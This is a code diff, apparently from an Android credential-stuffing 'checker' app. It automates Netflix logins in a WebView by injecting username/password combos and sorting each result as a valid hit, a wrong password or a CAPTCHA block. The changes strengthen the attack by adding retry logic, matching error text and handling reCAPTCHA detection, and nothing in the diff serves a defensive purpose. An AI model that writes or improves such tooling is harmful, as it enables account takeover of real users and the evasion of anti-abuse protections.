@@ -537,10 +537,12 @@ stats.cpm = stats.computeCpm()
                 }
                 var settled = false
                 val startedAt = System.currentTimeMillis()
-                val timeoutMs = 45000L
+                val timeoutMs = 95000L
                 val handler = Handler(Looper.getMainLooper())
                 var lastLogState = ""
-                var fillInjectedAt = 0L
+                var fillInjectedAt = startedAt
+                var fillCount = 0
+                var submittedAt = 0L
 
                 fun settle(acc: Account) {
                     if (settled) return
@@ -556,7 +558,8 @@ stats.cpm = stats.computeCpm()
 
                 fun injectFill() {
                     fillInjectedAt = System.currentTimeMillis()
-                    log("Netflix(browser): injecting credentials into form")
+                    fillCount++
+                    log("Netflix(browser): injecting credentials into form (attempt #$fillCount)")
                     fillNetflixLogin(wv, combo)
                 }
 
@@ -576,40 +579,57 @@ stats.cpm = stats.computeCpm()
                         val cap = data?.optBoolean("cap", false) == true
                         val snippet = (data?.optString("t", "") ?: "").take(140)
                         val elapsed = System.currentTimeMillis() - startedAt
+                        val bodyText = (data?.optString("t", "") ?: "").lowercase()
 
                         val stateKey = "u=$url|fs=$fs|err=$err"
                         if (stateKey != lastLogState) {
                             lastLogState = stateKey
-                            log("Netflix(browser): url=$url | title=${title.take(60)} | fill=$fs | err=$err | cap=$cap | body=$snippet")
+                            log("Netflix(browser): url=${url.take(60)}... | title=${title.take(50)} | fill=$fs | err=$err | cap=$cap | body=$snippet")
                         }
+
+                        if (fs == "submitted" && submittedAt == 0L) {
+                            submittedAt = System.currentTimeMillis()
+                            log("Netflix(browser): form submitted, waiting for server response")
+                        }
+                        val sinceSubmit = if (submittedAt > 0) System.currentTimeMillis() - submittedAt else 0L
+                        val canRetry = fillCount < 3 && System.currentTimeMillis() - fillInjectedAt > 12000
+                        val textErr = bodyText.contains("incorrect password") || bodyText.contains("doesn.t match") ||
+                            bodyText.contains("does not match") || bodyText.contains("no account found") ||
+                            bodyText.contains("not associated") || bodyText.contains("invalid password") ||
+                            bodyText.contains("enter a valid email") || bodyText.contains("haven.t found")
 
                         when {
                             url.contains("/browse") || url.contains("YourAccount") || url.contains("profiles") -> {
                                 settle(createResult(combo, AccountStatus.HIT, "Valid Netflix account"))
                             }
-                            err -> {
-                                val bodyText = (data?.optString("t", "") ?: "").lowercase()
+                            err || textErr -> {
                                 val blocked = bodyText.contains("try again") || bodyText.contains("in a few minutes") ||
                                     bodyText.contains("captcha") || bodyText.contains("recaptcha") || bodyText.contains("too many attempts")
                                 settle(createResult(combo, if (blocked) AccountStatus.CAPTCHA else AccountStatus.FAIL,
                                     if (blocked) "Netflix: blocked by reCAPTCHA" else "Wrong Netflix credentials"))
                             }
-                            fs == "submitted" && cap && elapsed > 20000 && !url.contains("browse") -> {
-                                settle(createResult(combo, AccountStatus.CAPTCHA, "Netflix: reCAPTCHA challenge shown"))
+                            submittedAt > 0 && sinceSubmit > 30000 -> {
+                                val challenge = cap && (bodyText.contains("robot") || bodyText.contains("verify") ||
+                                    bodyText.contains("human") || bodyText.contains("challenge") || bodyText.contains("isn't you"))
+                                when {
+                                    challenge -> settle(createResult(combo, AccountStatus.CAPTCHA, "Netflix: reCAPTCHA challenge shown"))
+                                    canRetry -> {
+                                        log("Netflix(browser): no result ${sinceSubmit/1000}s after submit, re-injecting")
+                                        injectFill()
+                                        handler.postDelayed({ pollResult() }, 1500)
+                                    }
+                                    else -> settle(createResult(combo, AccountStatus.ERROR,
+                                        "Netflix: no response after submit url=${url.take(80)}"))
+                                }
                             }
-                            fs.isEmpty() && elapsed > 20000 && System.currentTimeMillis() - fillInjectedAt > 15000 -> {
-                                log("Netflix(browser): login form never appeared, retrying fill")
-                                injectFill()
-                                handler.postDelayed({ pollResult() }, 1500)
-                            }
-                            fs == "no_fields" && elapsed > 20000 && System.currentTimeMillis() - fillInjectedAt > 15000 -> {
-                                log("Netflix(browser): fields not found, retrying fill")
+                            (fs.isEmpty() || fs == "no_fields") && canRetry -> {
+                                log("Netflix(browser): login form not ready, retrying fill")
                                 injectFill()
                                 handler.postDelayed({ pollResult() }, 1500)
                             }
                             elapsed > timeoutMs -> {
                                 settle(createResult(combo, AccountStatus.ERROR,
-                                    "Netflix: browser timeout url=$url fill=$fs"))
+                                    "Netflix: browser timeout url=${url.take(80)} fill=$fs"))
                             }
                             else -> handler.postDelayed({ pollResult() }, 1200)
                         }
@@ -631,8 +651,8 @@ stats.cpm = stats.computeCpm()
 
                         override fun onPageFinished(view: WebView?, url: String?) {
                             if (settled) return
-                            log("Netflix(browser): page finished url=$url")
-                            view?.postDelayed({
+                            log("Netflix(browser): page finished url=${url?.take(70)}")
+                            handler.postDelayed({
                                 if (settled) return@postDelayed
                                 injectFill()
                             }, 1500)
